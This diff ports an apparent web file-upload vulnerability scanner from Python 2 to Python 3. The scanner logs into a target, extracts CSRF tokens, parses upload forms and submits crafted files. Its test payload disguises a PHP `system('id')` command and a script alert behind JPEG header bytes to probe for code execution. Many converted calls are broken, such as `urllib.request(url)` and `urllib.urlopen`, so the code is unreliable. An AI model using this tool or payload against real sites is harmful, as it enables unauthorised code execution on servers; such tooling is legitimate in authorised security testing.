@@ -1,21 +1,24 @@
+from encodings import utf_8
 import urllib
 import hashlib
 import datetime
 import re
-import urllib2
-import cookielib
-import Cookie
+import urllib.parse
+import urllib.request
+import http.cookiejar as cookielib
+import http.cookies as Cookie
 from bs4 import BeautifulSoup
 import time, os
 import random
 import zlib
 import gzip
-import StringIO as StrIO
+from io import StringIO as StrIO
 
 import itertools
-import mimetools
+import email
+import email.generator
 import mimetypes
-from cStringIO import StringIO
+#from cStringIO import StringIO
 
 from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
@@ -45,7 +48,7 @@ class MultiPartForm(object):
   def __init__(self):
     self.form_fields = []
     self.files = []
-    self.boundary = mimetools.choose_boundary()
+    self.boundary = email.generator._make_boundary()
     return
 
   def get_content_type(self):
@@ -134,11 +137,11 @@ class headlessTester(object):
     else:
       # if it is not,
       try:
-        req = urllib2.Request(url)
+        req = urllib.request(url)
         if Debug:
-          print "[http request] full verification urlopen"
-        res = urllib2.urlopen(req)
-      except urllib2.HTTPError as e:
+          print("[http request] full verification urlopen")
+        res = urllib.urlopen(req)
+      except urllib.error.HTTPError as e:
         res_code = e.code
         res = None
 
@@ -203,7 +206,7 @@ class headlessTester(object):
 
 
 # 302 Request Catcher
-class ResponseCatcher(urllib2.HTTPErrorProcessor):
+class ResponseCatcher(urllib.error.HTTPError):
   def http_response(self,request,response):
     return response
   https_response = http_response
@@ -328,8 +331,8 @@ def tryLogin(target):
 
   # Build Request
   cookieJar = cookielib.CookieJar()
-  loginOpener = urllib2.build_opener(ResponseCatcher, urllib2.HTTPCookieProcessor(cookieJar))
-  req = urllib2.Request(target['webLoginURL'],urllib.urlencode(data))
+  loginOpener = urllib.build_opener(ResponseCatcher, urllib.HTTPCookieProcessor(cookieJar))
+  req = urllib.Request(target['webLoginURL'],urllib.urlencode(data))
   if 'webCSRFHeader' in target.keys() and target['webCSRFHeader'] != None:
     req.add_header(target['webCSRFHeader'][0],target['webCSRFHeader'][1])
   # if basic cookie exist, it is appended to request header
@@ -350,17 +353,17 @@ def tryLogin(target):
     while res.code >= 300 and res.code < 400:
       if '/' not in res.headers['Location']:
         baseurl = target['webLoginPageURL'].rsplit('/',1)[0]
-        red_req = urllib2.Request("{}/{}".format(baseurl,res.headers['Location']))
+        red_req = urllib.Request("{}/{}".format(baseurl,res.headers['Location']))
       elif 'http://' not in res.headers['Location']:
         # case for "Location : /relation/path"
         relocation_path = res.headers['Location']
         if relocation_path[0] == '/':
           relocation_path = relocation_path[1:]
-        red_req = urllib2.Request("{}/{}".format(target['webHost'],relocation_path))
+        red_req = urllib.Request("{}/{}".format(target['webHost'],relocation_path))
 
       else:
         # case for "Location : http://blah.blahblah.bl/relation/path"
-        red_req = urllib2.Request(res.headers['Location'])
+        red_req = urllib.Request(res.headers['Location'])
 
       logined_cookie = None
 
@@ -386,14 +389,14 @@ def tryLogin(target):
     logined_page = res.read()
   # response code is not 200 or 302 | 303, this login try maybe failed
   else:
-    print "[-] Can not Login.."
+    print("[-] Can not Login..")
   # Verify Login using string
   if target["webLoginSuccessStr"] in logined_page:
-    print "[+] Login Success"
+    print("[+] Login Success")
     return setCookie
 
   else:
-    print "[-] Login Fail"
+    print("[-] Login Fail")
     exit(0)
 
 
@@ -402,9 +405,9 @@ def tryLogin(target):
 def urlValidator(target,CSRF=None):
   url = customTag(target,target["webLoginPageURL"])
   cookieJar = cookielib.CookieJar()
-  loginOpener = urllib2.build_opener(ResponseCatcher, urllib2.HTTPCookieProcessor(cookieJar))
+  loginOpener = urllib.build_opener(ResponseCatcher, urllib.HTTPCookieProcessor(cookieJar))
 
-  req = urllib2.Request(url)
+  req = urllib.Request(url)
   addHeader(req,target["webHost"])
   res = loginOpener.open(req)
   cookie = ''
@@ -417,21 +420,21 @@ def urlValidator(target,CSRF=None):
       if 'http://' not in res.headers['Location']:
         # case for "Location : /relation/path"
 
-        print "*{}{}".format(target['webHost'],res.headers['Location'])
-        red_req = urllib2.Request("{}{}".format(target['webHost'],res.headers['Location']))
+        print("*{}{}".format(target['webHost'],res.headers['Location']))
+        red_req = urllib.Request("{}{}".format(target['webHost'],res.headers['Location']))
       else:
         # case for "Location : http://blah.blahblah.bl/relation/path"
-        red_req = urllib2.Request(res.headers['Location'])
+        red_req = urllib.Request(res.headers['Location'])
       red_req.add_header('Cookie',cookie)
       addHeader(red_req,target['webHost'],target['webLoginPageURL'])
       if Debug:
-        print "[http request] urlValidator urlopen"
-      res = urllib2.urlopen(red_req)
+        print("[http request] urlValidator urlopen")
+      res = urllib.urlopen(red_req)
       continue
     try:
       data = res.read()
     except:
-      print "response read fail"
+      print("response read fail")
       exit(0)
     if res.code == 200 or len(data)>0:
       CSRFValue = None
@@ -483,17 +486,17 @@ def getCSRFToken(res_obj, html,CSRFEles,target):
         if data != None:
           target['webCSRFHeader'] = [findname[2],csrftoken]
         else:
-          print "[-] CSRFToken was not found in upload page"
+          print("[-] CSRFToken was not found in upload page")
           exit(0)
 
       elif header_name[0] == 'header':
         if header_name[1] in res_obj.headers.keys():
           target['webCSRFHeader'] = [header_name,res_obj.headers[header_name[1]]]
         else:
-          print "[-] Can't not found CSRF Token in Response Header"
+          print("[-] Can't not found CSRF Token in Response Header")
           exit(0)
       else:
-        print "[-] Weird CSRF Expression"
+        print("[-] Weird CSRF Expression")
         exit(0)
     else:
       try:
@@ -522,13 +525,13 @@ def formParser(target):
   if len(formAttr[0]) == 0:
     return
 
-  req = urllib2.Request(customTag(target,target['webUploadPageURL']))
+  req = urllib.Request(customTag(target,target['webUploadPageURL']))
   req.add_header('Cookie',target['webLoginCookie'])
   addHeader(req,target['webHost'])
   req.add_header('Accept-encoding', 'gzip,deflate')
   if Debug:
-    print "[http request] formParser urlopen"
-  res = urllib2.urlopen(req)
+    print("[http request] formParser urlopen")
+  res = urllib.urlopen(req)
   if 'content-encoding' in res.headers.keys():
     cnt = res.headers['content-encoding']
   else:
@@ -579,7 +582,7 @@ def formParser(target):
       elif isexist_flag:
         pass
       else:
-        print "  [!] Parameter {} isn't found from upload page".format(checker_param[0])
+        print("  [!] Parameter {} isn't found from upload page".format(checker_param[0]))
         param.append('{}='.format(checked_param[0]))
 
   if form['action'] == '':
@@ -604,13 +607,13 @@ def makeUploadRequest(target,uploadFile):
 
   # Append CSRF Token to Body
   if (target['webUploadCSRFName'] != ''):
-    semi_req = urllib2.Request(customTag(target,target['webUploadPageURL']))
+    semi_req = urllib.request(customTag(target,target['webUploadPageURL']))
     addHeader(semi_req, target['webHost'])
     semi_req.add_header('Cookie',target['webLoginCookie'])
     semi_req.add_header('Accept-encoding', 'gzip,deflate')
     if Debug:
-      print "[http request] makeUploadRequest urlopen(CSRF Append)"
-    semi_res = urllib2.urlopen(semi_req)
+      print("[http request] makeUploadRequest urlopen(CSRF Append)")
+    semi_res = urllib.urlopen(semi_req)
     if 'content-encoding' in semi_res.headers.keys():
       cnt = semi_res.headers['content-encoding']
     else:
@@ -637,7 +640,7 @@ def makeUploadRequest(target,uploadFile):
         if return_url != "":
           target["webDynamicUploadURL"] = return_url
         else:
-          print "[-] Not Found Dynamic upload URL"
+          print("[-] Not Found Dynamic upload URL")
           exit(0)
 
   # Append other parameters to Body
@@ -707,13 +710,13 @@ def customTag(target, data):
             break
     elif custom[0] == "domtoken":
       arg = custom[1].rsplit('@',1)
-      token_req = urllib2.Request(customTag(target,target['webUploadPageURL']))
+      token_req = urllib.Request(customTag(target,target['webUploadPageURL']))
       token_req.add_header('cookie',target['webLoginCookie'])
       token_req.add_header('Accept-encoding', 'gzip,deflate')
       addHeader(token_req,target['webHost'])
       if Debug:
-        print "[http request] custom tag - domtoken urllib2"
-      token_res_obj = urllib2.urlopen(token_req)
+        print("[http request] custom tag - domtoken urllib2")
+      token_res_obj = urllib.urlopen(token_req)
       if "content-encoding" in token_res_obj.headers.keys():
         cnt = token_res_obj.headers['content-encoding']
       else:
@@ -743,7 +746,7 @@ def customTag(target, data):
         if return_url != "":
           target["webDynamicUploadURL"] = return_url
         else:
-          print "[-] Not Found Dynamic upload URL"
+          print("[-] Not Found Dynamic upload URL")
           exit(0)
 
 
@@ -761,41 +764,41 @@ def uploadFile(target, upload_req):
     url = customTag(target,target['webUploadURL'])
   url = url_simplizer(target['webUploadPageURL'], url)
   try:
-    req = urllib2.Request(url.encode('ascii'))
+    req = urllib.request.Request(url)
     req.add_header('Content-Type', upload_req['type'])
     req.add_header('Content-Length', len(upload_req['body']))
     req.add_header('Cookie',target['webLoginCookie'])
-    req.add_data(upload_req['body'])
+    req.data = bytes(upload_req['body'], 'ascii')
     addHeader(req, target['webHost'], referer=customTag(target,target['webUploadPageURL']))
     if target['webUploadCustomHeader'] != '':
       custom = target['webUploadCustomHeader'].split('=',1)
       if len(custom) >0:
         req.add_header(custom[0], custom[1])
       else:
-        print "[-] Custom Header is wrong"
+        print("[-] Custom Header is wrong")
         exit(0)
     if 'webCSRFHeader' in target.keys() and target['webCSRFHeader'] != None:
       req.add_header(target['webCSRFHeader'][0],target['webCSRFHeader'][1])
     req.add_header('Accept-encoding', 'gzip,deflate')
 
     if Debug:
-      print "[http request] uploadFile urlopen"
-    res_obj = urllib2.urlopen(req)
-  except urllib2.HTTPError as e:
+      print("[http request] uploadFile urlopen")
+    res_obj = urllib.request.urlopen(req)
+  except urllib.error.HTTPError as e:
     res_obj = e
 
   if res_obj.code >=300 and res_obj.code<400:
     redirect_url = res_obj.headers['Location']
     while True:
-     rereq = urllib2.Request(redirect_url)
+     rereq = urllib.request(redirect_url)
      rereq.add_header('Accept-encoding','gzip,deflate')
      rereq.add_header('Cookie',target['webLoginCookie'])
      addHeader(rereq, target['webHost'], referer=url)
      try:
        if Debug:
-         print "[http request] upload File - 302 re-urlopen"
-       res_obj = urllib2.urlopen(rereq)
-     except urllib2.HTTPError as e:
+         print("[http request] upload File - 302 re-urlopen")
+       res_obj = urllib.urlopen(rereq)
+     except urllib.HTTPError as e:
        res_obj = e
      if not (res_obj.code >=300 and res_obj.code<400):
        break
@@ -818,7 +821,7 @@ def uploadFile(target, upload_req):
       else:
         return (False, res)
   else:
-    checker = target['webUploadSuccessStr']
+    checker = bytes(target['webUploadSuccessStr'], 'ascii')
   if res != None and checker in res:
     return (True, res)
   else:
@@ -827,13 +830,13 @@ def uploadFile(target, upload_req):
 def accessValidation(target, url, content, resultString, seedType):
   if not  HEADLESS_VERIFY:
     try:
-      req = urllib2.Request(url.encode('ascii'))
+      req = urllib.Request(url.encode('ascii'))
       req.add_header('Cookie',target['webLoginCookie'])
       addHeader(req, target['webHost'])
       if Debug:
-        print "[http request] light-verification urlopen"
-      res = urllib2.urlopen(req)
-    except urllib2.HTTPError as e:
+        print("[http request] light-verification urlopen")
+      res = urllib.urlopen(req)
+    except urllib.HTTPError as e:
       res = e
     resCode = res.code
     resData = res.read()
@@ -849,7 +852,7 @@ def accessValidation(target, url, content, resultString, seedType):
       else:
         cnt_type = None
       if "x-content-type-options" in res.headers.keys() and res.headers['x-content-type-options'] == "nosniff":
-        print "[-] Content Sniffing Banned!"
+        print("[-] Content Sniffing Banned!")
         isSniffBan = True
       if (seedType=='html' or seedType=='xhtml') and (cnt_type == None and not isSniffBan) or (cnt_type != None and ("text/html" in cnt_type or "application/xhtml+xml" in cnt_type)):
         return [True, "Code Exposed"]# php, js - Potencial Code Execution, html - Code Execution
@@ -908,10 +911,10 @@ def makeS1Data(m3_mut=""):
 def makeS1TestData():
   # S1 - test data
   output = {
-    'filename': hashlib.md5(datetime.datetime.now().__str__()).hexdigest(),
+    'filename': hashlib.md5(datetime.datetime.now().__str__().encode('ascii')).hexdigest(),
     'fileext': "jpg",
     'filetype': "image/jpg",
-    'content': """\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46<?php system('id');$sign=pack('H*',dechex((2534024256545858215*2)));print "<script>alert('".$sign."');</script>";?><!--{}-->""".format(os.urandom(8).encode('hex'))
+    'content': """\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46<?php system('id');$sign=pack('H*',dechex((2534024256545858215*2)));print "<script>alert('".$sign."');</script>";?><!--{}-->""".format(os.urandom(8))
   }
   return output
 
